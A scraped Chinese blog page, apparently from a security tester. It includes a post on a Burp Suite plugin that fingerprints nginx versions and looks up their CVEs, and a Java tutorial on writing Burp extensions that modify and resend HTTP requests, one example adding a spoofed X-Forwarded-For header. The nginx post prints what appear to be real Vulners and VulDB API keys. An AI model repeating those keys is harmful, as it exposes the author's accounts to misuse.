                <span class="token comment" spellcheck="true"># 解答：&amp;#123;4, 5, 6, 1, 2, 3&amp;#125;，nums[mid] = 6，low = mid + 1, 刚好nums[low] = 1</span>
                <span class="token comment" spellcheck="true">#继续疑问：上边的解释太牵强了，难道没有可能low = mid + 1, 正好错过了最小值</span>
                <span class="token comment" spellcheck="true">#继续解答：不会错过!!! 因为nums[mid]>=nums[right],所以nums[mid]一定不是最小值</span>
                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#nums[mid]==nums[right]</span>
                right<span class="token operator">=</span>right<span class="token number">-1</span>
        <span class="token keyword">return</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol><li><a target="_blank" rel="noopener" href="https://leetcode-cn.com/circle/discuss/Z80AkT/">二分法题目集合</a> 不错</li><li><a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array-ii/solution/yi-wen-dai-ni-gao-ding-er-fen-sou-suo-ji-ki52/">一文带你搞定二分搜索及多个变种</a></li><li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1d54y1q7k7">相关b站视频</a></li></ol><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/leetcpde/" rel="tag">leetcpde</a></li></ul></div><span class="post-count">总字数4.8k</span> <span class="post-count">预计阅读20分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-burpsuite-develop-detect-nginx" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/05/24/burpsuite-develop-detect-nginx/" class="article-date"><time class="published" datetime="2021-05-24T09:39:05.000Z" itemprop="datePublished">2021-05-24 发布</time> <time class="updated" datetime="2021-06-25T08:30:05.001Z" itemprop="dateUpdated">2021-06-25 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2021/05/24/burpsuite-develop-detect-nginx/">开发burpsuite插件-识别nginx版本并列出已知CVE</a></h1></header><div class="article-entry" itemprop="articleBody"><p>最近需要开发一个插件：首先需要识别初nginx的版本号，其次需要列出该版本号存在的CVE漏洞列表。</p><h1 id="1-识别nginx版本号"><a href="#1-识别nginx版本号" class="headerlink" title="1 识别nginx版本号"></a>1 识别nginx版本号</h1><p>首先识别nginx的版本号，我们知道nginx错误页会暴露该版本号，因此我们只需要解析response报文，利用正则表达式匹配出版本号即可。</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1624603419556.png" alt="1624603419556"></p><p>(1)获取Response报文</p><pre class="line-numbers language-java"><code class="language-java">String response <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(2)定义识别nginx的正则表达式为nginx/\d+(\.\d+){2}+然后进行正则匹配，获得nginx版本号</p><pre class="line-numbers language-java"><code class="language-java">String nginxRegex <span class="token operator">=</span> <span class="token string">"nginx/\\d+(\\.\\d+)&amp;#123;2&amp;#125;+"</span><span class="token punctuation">;</span>
Pattern p <span class="token operator">=</span> Pattern<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>RegexStr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">// 现在创建 matcher 对象</span>
String detectVersion<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
Matcher m <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
    detectVersion <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//得到nginx版本</span>
<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将上述代码编译成jar文件，加载到burpsuite上，运行如下：识别nginx成功。</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1621909703111.png" alt="1621909703111"></p><h1 id="2-检索该版本对应的CVE漏洞"><a href="#2-检索该版本对应的CVE漏洞" class="headerlink" title="2 检索该版本对应的CVE漏洞"></a>2 检索该版本对应的CVE漏洞</h1><p>检索对应版本存在的CVE漏洞其实有很多的网站：</p><p>例如下面几个网站 但是大多数的网站 该搜索功能结果都没有很准确</p><p><a target="_blank" rel="noopener" href="https://snyk.io/vuln/npm:lodash@4.17.15">https://snyk.io/vuln/npm:lodash@4.17.15</a> 结果准确</p><p><a target="_blank" rel="noopener" href="https://vulners.com/search?query=affectedSoftware.name:nginx%20AND%20affectedSoftware.version:%221.17.7%22">https://vulners.com/search?query=affectedSoftware.name:nginx%20AND%20affectedSoftware.version:%221.17.7%22</a> 结果特别不准确</p><p><a target="_blank" rel="noopener" href="https://vuldb.com/zh/?search.advanced#results">https://vuldb.com/zh/?search.advanced#results</a> 结果相对准确 但是不全 有遗漏</p><p>burpsuite</p><p>识别nginx版本并索引已经知道的CVE漏洞：<br>搜索已经知道的CVE漏洞：<br>1 爬虫：爬取vul,cve网站上的CVE信息：网站设置防爬<br>2 匹配：正则匹配？机器学习去匹配</p><p>调研：bp的插件：Software Vulnerability Scanner利用vulner.comAPI进行扫描探测</p><p>初步思路：</p><h1 id="第一种API接口使用："><a href="#第一种API接口使用：" class="headerlink" title="第一种API接口使用："></a>第一种API接口使用：</h1><p>问题：python有对应的库但是存在burpsuite加载不成功的问题，但是java无，只能通过APi访问，但是 搜索不准确，</p><p><a target="_blank" rel="noopener" href="https://vulners.com/">https://vulners.com/</a></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1622014351054.png" alt="1622014351054"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1622015887598.png" alt="1622015887598"></p><p>获取API获取Vulners API密钥</p><p>请在<a target="_blank" rel="noopener" href="https://vulners.com/">Vulners网站上</a>注册。通过单击右上角的名称进入个人菜单。遵循“ API KEYS”标签。生成范围为“ <strong>api</strong>”的API密钥，并将其与库一起使用。</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1622081435003.png" alt="1622081435003"></p><p><strong>API Key -</strong> 7CX5RVZEMZ6M5RGRI3GPJ6IEJO0ZSV6JLZ7SHO022C1ZJ7XIB32EJIB0NI47ICFK</p><p><strong>Created -</strong> 2021-05-27T05:10:27</p><p><strong>License Type -</strong> free</p><p><strong>Scope</strong></p><p>api</p><p><strong>IP List</strong></p><p>报错：</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1622097162280.png" alt="1622097162280"></p><p>但是直接在py运行是OK的</p><p>API用法参考：<a target="_blank" rel="noopener" href="https://github.com/vulnersCom/api/blob/master/samples/software_scanner.py">https://github.com/vulnersCom/api/blob/master/samples/software_scanner.py</a></p><h1 id="第二种API使用"><a href="#第二种API使用" class="headerlink" title="第二种API使用"></a>第二种API使用</h1><p><a target="_blank" rel="noopener" href="https://vuldb.com/zh/?doc.api">https://vuldb.com/zh/?doc.api</a></p><p>API： 8ddd49c11f021f3e3b6f192c54a9f794</p><p>但是每天只有50次积分 并且搜索不全面</p><p>pass</p><p>第三种</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623219451415.png" alt="1623219451415"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623220355231.png" alt="1623220355231"></p><p><a target="_blank" rel="noopener" href="https://docs.vulners.com/api/">Vulners官方API使用说明</a></p><p><a target="_blank" rel="noopener" href="https://github.com/vulnersCom/api/blob/master/samples/software_scanner.py">Vulners API使用参考</a></p><p><a target="_blank" rel="noopener" href="https://c.runoob.com/front-end/854">正则表达式在线测试</a></p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zp437734552/article/details/51469549">正则表达式判断版本号</a></p><p><a target="_blank" rel="noopener" href="https://github.com/portswigger/software-vulnerability-scanner">根据版本号搜索CVE的插件</a></p><p><a target="_blank" rel="noopener" href="http://sh1yan.top/2020/03/02/Writing-the-burpseuite-plug-in-beginner/">API解释</a></p><p>app-portal:</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380555468.png" alt="1623380555468"></p><p>dev-portal:</p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380707202.png" alt="1623380707202"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380812981.png" alt="1623380812981"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380835346.png" alt="1623380835346"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380855686.png" alt="1623380855686"></p><p><img src="/2021/05/24/burpsuite-develop-detect-nginx/1623380922717.png" alt="1623380922717"></p><p><a target="_blank" rel="noopener" href="https://portal-ppe1.envisioniot.com/portal/testt">https://portal-ppe1.envisioniot.com/portal/testt</a></p><link href="//src.wangriyu.wang/lib/Aplayer/APlayer.min.css" rel="stylesheet"><script src="//src.wangriyu.wang/lib/Aplayer/APlayer.min.js"></script><div id="aplayer"></div><script src="/js/player.js"></script></div><div class="article-info article-info-index"><div class="article-count"><div class="article-tag tagcloud"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/" rel="tag">插件开发</a></li></ul></div><span class="post-count">总字数646</span> <span class="post-count">预计阅读2分钟</span></div><div class="clearfix"></div></div></div></article><article id="post-burpsuite-develop" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><a href="/2021/05/21/burpsuite-develop/" class="article-date"><time class="published" datetime="2021-05-21T08:41:38.000Z" itemprop="datePublished">2021-05-21 发布</time> <time class="updated" datetime="2021-06-25T03:33:13.590Z" itemprop="dateUpdated">2021-06-25 更新</time></a></div><div class="article-inner"><input type="hidden" class="isFancy"><header class="article-header"><h1 itemprop="name"><a class="article-title" href="/2021/05/21/burpsuite-develop/">从0开发burpsuite插件（Java）</a></h1></header><div class="article-entry" itemprop="articleBody"><p>本人从0开始，写一个bp的开发教程，思路为：跟着教程搭建出一个可以用在burpsuite的插件，然后在此基础上构建一个由GUI的插件，后面进一步去熟悉插件相关的API函数。本文教程基于gradle项目，因为方便引言一些插件库。</p><h2 id="1-一个小的bp插件Demo"><a href="#1-一个小的bp插件Demo" class="headerlink" title="1 一个小的bp插件Demo"></a>1 一个小的bp插件Demo</h2><h3 id="1-1新建一个gradle项目"><a href="#1-1新建一个gradle项目" class="headerlink" title="1.1新建一个gradle项目"></a>1.1新建一个gradle项目</h3><p>(1)新建一个gradle项目，项目名为：burp-detect-nginx</p><p><img src="/2021/05/21/burpsuite-develop/1621586533328.png" alt="1621586533328"></p><p>(2)新建完后，在 build.gradle 文件中添加以下依赖，也就是加载 burpsuite 插件API ，如果提示 auto import， 可以点击，从而自动从远程仓库加载 burpsuite API 。具体需要的版本可以去<a target="_blank" rel="noopener" href="https://search.maven.org/artifact/net.portswigger.burp.extender/burp-extender-api">Maven中央存储库</a>搜索，这里使用的是1.7.13</p><pre><code>compile(&#39;net.portswigger.burp.extender:burp-extender-api:1.7.13&#39;)</code></pre><p>同时在 plugins 里面添加 shadow 插件，该插件可以方便把项目打包成 jar 包。shadow版本需要根据自己的gadle版本去选择，<a target="_blank" rel="noopener" href="https://plugins.gradle.org/m2/com/github/jengelman/gradle/plugins/shadow/">shaow插件版本可以根据这里去选择</a>。这里我的选择的是4.0.3，然后保存 build.gradle文件可以看到加载成功。</p><pre><code>id &#39;com.github.johnrengelman.shadow&#39; version &#39;4.0.3&#39;</code></pre><p><img src="/2021/05/21/burpsuite-develop/1621592658534.png" alt="1621592658534"></p><p>(3)接着在 /src/main/java 目录处创建一个名为 burp 的包名，在 java 目录处右键 -&gt; New -&gt; Package，接着在该包上右键，新建一个名为 BurpExtender 的类。这里需要注意的是这个包名和类名是固定的，burpsuite 加载插件时就是通过 burp.BurpExtender 来查找的，如果不这样起名，会报 ClassNotFoundException 。</p><h3 id="1-2-编写插件"><a href="#1-2-编写插件" class="headerlink" title="1.2 编写插件"></a>1.2 编写插件</h3><p>在BurpExtender 中继承 IBurpExtender 接口，并实现registerExtenderCallbacks方法。（BurpExtender 类需要实现 IBurpExtender 接口，burp 在加载插件时，会调用该接口，并传递 IBurpExtenderCallbacks 接口仅我们使用。）registerExtenderCallbacks方法内添加下面的代码为插件设置名称，并打印一 success 字符串</p><pre><code>callbacks.setExtensionName(&quot;data-collect2&quot;);
callbacks.printOutput(&quot;load success&quot;);</code></pre><p><img src="/2021/05/21/burpsuite-develop/1621592834548.png" alt="1621592834548"></p><h3 id="1-3-编译为jar包"><a href="#1-3-编译为jar包" class="headerlink" title="1.3 编译为jar包"></a>1.3 编译为jar包</h3><p>点击右侧的 gradle 菜单，展开菜单，双击 shadowjar ，gradle 会自动编译项目成 jar 包，jar 包位于 build 目录中的 libs 目录中。 选中生成的jar包，右击show in exploer就可以得到我们的jar包</p><p><img src="/2021/05/21/burpsuite-develop/1621593085131.png" alt="1621593085131"></p><h3 id="1-4-burpsuite-加载该jia包"><a href="#1-4-burpsuite-加载该jia包" class="headerlink" title="1.4 burpsuite 加载该jia包"></a>1.4 burpsuite 加载该jia包</h3><p>在 burp 的扩展选项卡Extender-&gt;Extensions–&gt;Add，选择Java类型，加载jar包点next就可以看到加载成功。</p><p><img src="/2021/05/21/burpsuite-develop/1621593214656.png" alt="1621593214656"></p><p>可以看到加载插件后成功打印了 success 字符串。</p><p><img src="/2021/05/21/burpsuite-develop/1621593371239.png" alt="1621593371239"></p><h2 id="2-添加标签页"><a href="#2-添加标签页" class="headerlink" title="2 添加标签页"></a>2 添加标签页</h2><h3 id="2-1-创建一个标签页："><a href="#2-1-创建一个标签页：" class="headerlink" title="2.1 创建一个标签页："></a>2.1 创建一个标签页：</h3><p>(1)先在IDEA中创建一个 Form:file–&gt;new–GUI Form，用于设计UI ：在burp文件夹内如下图方式创建一个 DataCollectGUI.form</p><p><img src="/2021/05/21/burpsuite-develop/1621593462769.png" alt="1621593462769"></p><p>(2)创建的界面如下，左边的窗口中创建了两个文件，一个是 DataCollectGUI.java 文件，该文件与 form 文件绑定，一个是 DataCollectGUI.form 文件，可以在此文件上拖动控件来设计 UI 界面，当界面更新时，会自动生成代码插入 DataCollectGUI.java 文件中。 直接通过拖拉控件到面板即可完成UI设计。</p><p><img src="/2021/05/21/burpsuite-develop/1621593667153.png" alt="1621593667153"></p><h3 id="2-2-打包GUI类"><a href="#2-2-打包GUI类" class="headerlink" title="2.2 打包GUI类"></a>2.2 打包GUI类</h3><p>为了让 IDEA 打包 GUI 界面的类，需要在 build.gradle 添加以下依赖</p><pre><code>compile(&#39;com.intellij:forms_rt:7.0.3&#39;)</code></pre><p>（1）在设置中设置根据 Form 界面自动生成 Java 源码：file-settings-&gt;editor-&gt;GUI Designer–&gt;java source code-apply-ok</p><p><img src="/2021/05/21/burpsuite-develop/1621594071138.png" alt="1621594071138"></p><p>(2)然后在 Gradle 的编译选项中设置编译器是 IDEA 自带的编译器，这样才能自动更新 form 文件中的控件到代码中：file-settings-&gt;Build,Execution,Deployment-&gt;Build Tools-&gt;Gradle:做如图的配置。</p><p><img src="/2021/05/21/burpsuite-develop/1621594242374.png" alt="1621594242374"></p><p>(3)构建项目</p><p>设置好后，点击构建图标，就会自动生成和 form 文件相关的代码，可以看到在 $$$setupUI$$$() 方法中自动生成了我们拖到界面中的3个控件。</p><p><img src="/2021/05/21/burpsuite-develop/1621836741981.png" alt="1621836741981"></p><p>接着需要回到 BurpExtender 类中，要为插件添加一个标签页，需要实现 ITab 接口：实现 ITab 接口后，会有两个方法需要实现，其中 getTabCaption() 方法返回标签页的名称， getUiComponent() 方法返回我们创建的 UI 面板。callbacks.addSuiteTab(this) 来注册接口。</p><p><img src="/2021/05/21/burpsuite-develop/1621837625674.png" alt="1621837625674"></p><h3 id="2-3-设置按钮监听事件"><a href="#2-3-设置按钮监听事件" class="headerlink" title="2.3 设置按钮监听事件"></a>2.3 设置按钮监听事件</h3><p>接下来我们需要获取标签页中的配置内容，可以通过添加事件监听器来实现。回到 IDEA 的 form 文件中，在按钮上右键，点击 Create Listener，选择 ActionListener.在这里简单地把输入框中的内容打印在插件日志中，要把内容打印到插件日志中，我们需要获取 IBurpExtenderCallbacks 对象，可以修改构造函数，在初始化时传入：</p><p><img src="/2021/05/21/burpsuite-develop/1621837911606.png" alt="1621837911606"></p><p>还需要修改 BurpExtender 中的代码，传入 callbacks 对象</p><p><img src="/2021/05/21/burpsuite-develop/1621837935350.png" alt="1621837935350"></p><p>接着在监听器中实现获取标题内容并打印到日志的代码，代码中29行通过 getText()方法获取输入框架的内容，然后在30行处通过 callbacks.printOutput()方法打印内容到日志中。</p><h3 id="2-4-打包jar"><a href="#2-4-打包jar" class="headerlink" title="2.4 打包jar"></a>2.4 打包jar</h3><p>双击 gradle 中的 shadowjar 按钮重新打包 jar 包，然后在 burp 重新加载插件，在插件输入框中输入 12346849， 点击按钮，就会在插件日志中打印输入框中的内容了。</p><p><img src="/2021/05/21/burpsuite-develop/1621838299568.png" alt="1621838299568"></p><p><img src="/2021/05/21/burpsuite-develop/1621838343829.png" alt="1621838343829"></p><h2 id="3-burpsuite的HTTP处理"><a href="#3-burpsuite的HTTP处理" class="headerlink" title="3 burpsuite的HTTP处理"></a>3 burpsuite的HTTP处理</h2><p>开发burpsuite插件关键在于处理http请求和响应</p><h3 id="3-1-查看包的报文信息"><a href="#3-1-查看包的报文信息" class="headerlink" title="3.1 查看包的报文信息"></a>3.1 查看包的报文信息</h3><p>很多插件都是分析HTTP的请求包和响应包，去分析里面的内容实现某种功能。</p><p>HTTP相关处理主要是IHttpListener接口，他有个方法processHttpMessage用来处理HTTP消息，该方法有3个参数。其中toolflag表示burpsuite中流量的形式，比如通过代理，通过扫描等。具体对应值可以查看<a target="_blank" rel="noopener" href="https://portswigger.net/burp/extender/api/constant-values.html#burp.IBurpExtenderCallbacks">IBurpExtenderCallbacks接口</a>，例如IBurpExtenderCallbacks.TOOL_PROXY表示代理流量；messageInfo表示HTTP交互报文，我们就通过初该值的处理得到HTTP的request和response报文，具体处理如下：</p><p>（1）Request分析</p><p>首先可以通过messageInfo.getRequest()获得整个请求报文，然后利用IRequestInfo类对报文进行分解，得到header, body,url等信息</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processHttpMessage</span><span class="token punctuation">(</span><span class="token keyword">int</span> toolFlag<span class="token punctuation">,</span> <span class="token keyword">boolean</span> messageIsRequest<span class="token punctuation">,</span> IHttpRequestResponse messageInfo<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
IRequestInfo analyzeRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeRequest</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//对Request消息进行解体</span>
String request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//获得请求的body</span>
<span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> body <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getBodyOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//获取请求头，返回header参数列表</span>
List<span class="token operator">&lt;</span>String<span class="token operator">></span> headers <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//获取请求头的HTTP方法    </span>
String method<span class="token operator">=</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//获取请求头的参数列表       </span>
List<span class="token operator">&lt;</span>IParameter<span class="token operator">></span> Params<span class="token operator">=</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//获取请求头的URL </span>
URL url<span class="token operator">=</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）response分析</p><p>首先直接调用messageInfo.getResponse()获取整个response完整报文，如果想要对response分结构的获取，例如获取response报文的header,body等，需要借助IRequestInfo类对报文进行分解</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processHttpMessage</span><span class="token punctuation">(</span><span class="token keyword">int</span> toolFlag<span class="token punctuation">,</span> <span class="token keyword">boolean</span> messageIsRequest<span class="token punctuation">,</span> IHttpRequestResponse messageInfo<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> response <span class="token operator">=</span> messageInfo<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获得response完整报文</span>
    BurpExtender<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Response："</span><span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token comment" spellcheck="true">//对Response消息进行解体</span>
    IResponseInfo analyzeResponse <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//获得执行的状态码</span>
    <span class="token keyword">int</span> statusCode<span class="token operator">=</span>analyzeResponse<span class="token punctuation">.</span><span class="token function">getStatusCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//获得header参数</span>
    List<span class="token operator">&lt;</span>String<span class="token operator">></span> headers <span class="token operator">=</span> analyzeResponse<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-修改包重发"><a href="#3-2-修改包重发" class="headerlink" title="3.2 修改包重发"></a>3.2 修改包重发</h3><p>有些插件的功能需要对交互包进行修改，重发，下面提供几个修改点的例子。</p><h4 id="3-2-1-headers的CRUD，并发送新请求"><a href="#3-2-1-headers的CRUD，并发送新请求" class="headerlink" title="3.2.1 headers的CRUD，并发送新请求"></a>3.2.1 headers的CRUD，并发送新请求</h4><p>（1）获得headers</p><pre class="line-numbers language-javascript"><code class="language-javascript">IRequestInfo analyzeRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeRequest</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//对消息进行解体</span>
<span class="token comment" spellcheck="true">//获取i请求头，返回header参数列表</span>
List<span class="token operator">&lt;</span>String<span class="token operator">></span> headers <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）对header的CRUD</p><pre class="line-numbers language-java"><code class="language-java">String xforward<span class="token operator">=</span><span class="token string">"X-Forwarded-For:127.0.0.1"</span><span class="token punctuation">;</span>
headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>xforward<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（3）重新发送改变后的header的请求</p><p>注意重新构建新的Request，这里采用的是buildHttpRequest方法。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//重组请求信息</span>
    <span class="token comment" spellcheck="true">//获得请求的body</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> body <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getBodyOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> newRequest<span class="token operator">=</span>helpers<span class="token punctuation">.</span><span class="token function">buildHttpMessage</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">/*****************获取 http service**********************/</span>
    IHttpService service <span class="token operator">=</span> messageInfo<span class="token punctuation">.</span><span class="token function">getHttpService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//重新发送request</span>
    callbacks<span class="token punctuation">.</span><span class="token function">makeHttpRequest</span><span class="token punctuation">(</span>service<span class="token punctuation">,</span> newRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>
    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2修改URL，然后发送新的请求"><a href="#2-2修改URL，然后发送新的请求" class="headerlink" title="2.2修改URL，然后发送新的请求"></a>2.2修改URL，然后发送新的请求</h4><p>（1）获得原有URL</p><pre class="line-numbers language-java"><code class="language-java">IRequestInfo analyzeRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeRequest</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//对消息进行解体</span>
URL url <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(2)构建新的URL： URL的CRUD</p><p>注意，URL的new最好再try catch中去做，不然会报错</p><pre class="line-numbers language-java"><code class="language-java">String newUrlString <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"djkslahf@w*5%oi"</span><span class="token punctuation">;</span>
URL newUrl<span class="token punctuation">;</span>
